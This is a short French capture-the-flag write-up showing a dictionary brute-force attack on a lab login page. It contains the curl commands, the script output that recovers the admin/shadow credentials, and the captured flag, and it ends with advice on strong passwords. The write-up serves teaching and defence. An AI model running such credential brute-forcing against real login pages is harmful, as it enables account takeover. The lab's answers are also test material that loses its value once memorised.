# Bruteforce

## Exploitation

Il est possible de passer un username / password sur la page de login. Dans le cas d'une authentification echouée, une image `<img src="images/WrongAnswer.gif" alt="">` est retournée. On essaie ici avec `toto` / `tutu`

```bash
$> USERNAME=toto PASSWORD=tutu ; curl -s "http://192.168.99.100/index.php?page=signin&username=$USERNAME&password=$PASSWORD&Login=Login" | grep "WrongAnswer.gif"

<center><h2 style="margin-top:50px;"></h2><br/><img src="images/WrongAnswer.gif" alt=""></center>
```

Nous allons utiliser cette requete pour faire une attaque par Bruteforce en essayant des combinaisons de login / password courante.

Si dans le body de la reponse, nous avons l'image `WrongAnswer.gif` c'est que la combinaison est mauvaise.

Nous avons écrit ce [script](./script.sh) qui va checker pour differents username les password présent dans un fichier `dictionary` comportant les mots de passes les plus courant (trouvé [ici](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/best110.txt)) :

```bash
$> ./script.sh
Usage: ./script.sh <host> <input-file>
Example: ./script.sh 192.168.99.100 dictionary

$> ./script.sh 192.168.99.100 dictionary
==== TESTING USER : admin
failed for admin / 000000
failed for admin / 111111
failed for admin / 123123
failed for admin / 123321
failed for admin / 1234
success for admin / shadow
```

Donc on a bien succes avec le login `admin` et le mot de passe `shadow`. Le flag est dans la page:

```bash
$> USERNAME=admin PASSWORD=shadow ; curl -s "http://192.168.99.100/index.php?page=signin&username=$USERNAME&password=$PASSWORD&Login=Login" | grep flag

The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

## Resolution

Il est deconseillé d'utiliser des usernames trop communs comme `root` ou `admin`.

Il faut utiliser des mot de passe forts (chiffres + lettres + caracteres speciaux), length > 10,  pas de mots du dictionnaire.
